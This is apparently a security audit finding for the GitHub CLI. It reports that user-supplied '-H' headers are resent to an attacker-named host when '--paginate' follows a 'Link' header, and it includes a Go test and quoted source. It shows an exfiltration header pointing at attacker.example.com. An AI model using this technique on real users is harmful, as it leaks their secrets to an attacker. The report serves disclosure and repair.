### Title
Custom `-H` request headers (including secrets) are replayed to an attacker-controlled host reached via a `Link` pagination redirect - ([File: pkg/cmd/api/http.go, pkg/cmd/api/api.go, pkg/cmd/api/pagination.go])

### Summary
When `gh api --paginate` follows a `Link: rel="next"` response header, the next-page URL is taken verbatim from the (attacker-controlled) server response and can point to an entirely different host, yet the same `requestHeaders` slice supplied via `-H`/`--header` on the command line is reused unmodified for every subsequent page. Unlike the CLI's automatically injected `Authorization` token, which is explicitly guarded against being sent across a hostname change, user-supplied custom headers have no such host-scoping check.

### Finding Description
`apiRun` builds `requestHeaders := opts.RequestHeaders` once [1](#0-0) , then loops over pages: `requestPath, hasNextPage = findNextPage(resp)` replaces the request path with whatever URL was found in the response's `Link` header, and the loop calls `httpRequest(httpClient, host, method, requestPath, requestBody, requestHeaders)` again using the very same `requestHeaders` [2](#0-1) . `findNextPage` extracts the URL directly from the `Link` response header with a regex and returns it unchanged [3](#0-2)  — this value is entirely attacker-controlled since it comes from the response of the host the victim is querying.

In `httpRequest`, if the path contains `"://"` (true for the absolute URL taken from `Link`), the `hostname` argument is ignored completely and `requestURL = p` is used as-is [4](#0-3) . Then all `headers` (the `-H` values) are unconditionally attached with `req.Header.Add(name, value)`, with no host check whatsoever [5](#0-4) .

This contrasts with `AddAuthTokenHeader`, which explicitly detects a redirect hostname change and refuses to attach the CLI's own auto-resolved `Authorization` token in that case [6](#0-5) . That protection only covers the token the CLI resolves internally from stored credentials — it does nothing for header values the user explicitly supplies via `-H`, which flow through the separate, unguarded `httpRequest` header-attachment path.

### Impact Explanation
Any secret a victim passes via `-H` (e.g. a bearer token or API key intended only for the initial, trusted endpoint) is resent verbatim to whatever host is specified in the attacker's `Link` header on subsequent pagination requests. This matches "Authenticated request to an attacker host" / credential exfiltration through wrong-host routing.

### Likelihood Explanation
Requires: (1) the victim runs `gh api --paginate` with a custom `-H` header carrying a secret, and (2) the endpoint being queried is attacker-controlled or attacker-influenced (e.g. `gh api https://attacker.example.com/...`, or a GHES/third-party host the attacker operates, or any endpoint whose response the attacker can shape, per the allowed threat model "controls responses from a host the victim points gh at"). Given that scenario, exploitation is deterministic and repeatable — the attacker only needs to return a `Link: <https://attacker.example.com/exfil>; rel="next"` header on the first response.

### Recommendation
In `apiRun`'s pagination loop, re-derive/scope `requestHeaders` per request based on whether the resolved next-page URL's host matches the originally intended host (mirroring the `redirectHostnameChange` check already used for the auto-injected `Authorization` header), and strip or refuse to resend user-supplied headers when the host changes, or restrict `--paginate` to same-host `Link` URLs only.

### Proof of Concept
```go
func TestPaginateDoesNotLeakCustomHeaderCrossHost(t *testing.T) {
    var secondServerSawSecret bool
    victimServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Link", `<https://attacker.example.com/next>; rel="next"`)
        w.Write([]byte(`[{"id":1}]`))
    }))
    attackerServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        if r.Header.Get("X-Secret") == "abc" {
            secondServerSawSecret = true
        }
        w.Write([]byte(`[]`))
    }))
    // point requestPath at victimServer, set opts.RequestHeaders = []string{"X-Secret: abc"}, opts.Paginate = true
    // run apiRun(opts)
    if secondServerSawSecret {
        t.Fatal("custom header leaked to attacker-controlled next-page host")
    }
}
```
Expected (current, vulnerable) behavior: `secondServerSawSecret == true`. Expected (fixed) behavior: header is stripped/not sent once the next-page host differs from the originally requested host.

```go
var linkRE = regexp.MustCompile(`<([^>]+)>;\s*rel="([^"]+)"`)

func findNextPage(resp *http.Response) (string, bool) {
	for _, m := range linkRE.FindAllStringSubmatch(resp.Header.Get("Link"), -1) {
		if len(m) > 2 && m[2] == "next" {
			return m[1], true
		}
	}
	return "", false
}
```

```go
func AddAuthTokenHeader(rt http.RoundTripper, cfg tokenGetter) http.RoundTripper {
	return &funcTripper{roundTrip: func(req *http.Request) (*http.Response, error) {
		// If the header is already set in the request, don't overwrite it.
		if req.Header.Get(authorization) == "" {
			var redirectHostnameChange bool
			if req.Response != nil && req.Response.Request != nil {
				redirectHostnameChange = getHost(req) != getHost(req.Response.Request)
			}
			// Only set header if an initial request or redirect request to the same host as the initial request.
			// If the host has changed during a redirect do not add the authentication token header.
			if !redirectHostnameChange {
				hostname := ghauth.NormalizeHostname(getHost(req))
				if token, _ := cfg.ActiveToken(hostname); token != "" {
					req.Header.Set(authorization, fmt.Sprintf("token %s", token))
				}
			}
		}
		return rt.RoundTrip(req)
	}}
}
```
